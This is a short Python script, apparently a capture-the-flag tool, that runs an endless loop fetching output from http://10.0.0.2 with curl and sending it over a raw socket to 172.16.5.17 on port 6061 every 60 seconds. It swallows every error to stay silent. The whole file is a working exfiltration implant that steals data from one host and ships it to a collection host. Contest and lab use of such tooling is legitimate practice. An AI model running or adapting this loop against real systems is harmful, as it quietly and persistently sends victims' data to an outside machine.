#!/usr/bin/env python
#-*- coding:utf-8 -*-
import subprocess,socket,time

flag_url = 'curl -s http://10.0.0.2'
host = '172.16.5.17'
port = 6061

def main():
    socket.setdefaulttimeout(5)
    while True:
        try:
            #flag = subprocess.check_output(flag_url, shell=True)
            p = subprocess.Popen(flag_url,shell=True,stdout=subprocess.PIPE)  
            flag = p.stdout.readlines()  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            sock.connect((host, port))  
            sock.send(flag)  
            sock.close()
        except KeyboardInterrupt:
            exit()
        except:
            pass
        time.sleep(60)

if __name__ == '__main__':
    main()